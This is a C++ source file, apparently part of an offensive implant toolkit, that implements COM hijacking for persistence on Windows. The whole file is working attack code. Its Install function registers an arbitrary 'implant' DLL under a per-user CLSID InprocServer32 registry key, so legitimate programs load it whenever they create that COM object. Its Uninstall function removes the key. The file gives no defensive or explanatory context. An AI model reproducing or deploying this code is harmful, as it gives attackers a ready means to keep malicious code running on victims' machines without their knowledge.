#include "ComHijacker.h"
#include <iostream>

namespace persistence {

bool ComHijacker::Install(const std::string& implantPath, const std::string& clsid) {
    HKEY hKey;
    std::string subkey = "Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32";
    
    if (RegCreateKeyExA(HKEY_CURRENT_USER, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }

    if (RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)implantPath.c_str(), (DWORD)implantPath.length() + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    const char* threadingModel = "Both";
    RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (const BYTE*)threadingModel, (DWORD)strlen(threadingModel) + 1);

    RegCloseKey(hKey);
    return true;
}

bool ComHijacker::Uninstall(const std::string& clsid) {
    std::string subkey = "Software\\Classes\\CLSID\\" + clsid;
    return RegDeleteTreeA(HKEY_CURRENT_USER, subkey.c_str()) == ERROR_SUCCESS;
}

} // namespace persistence
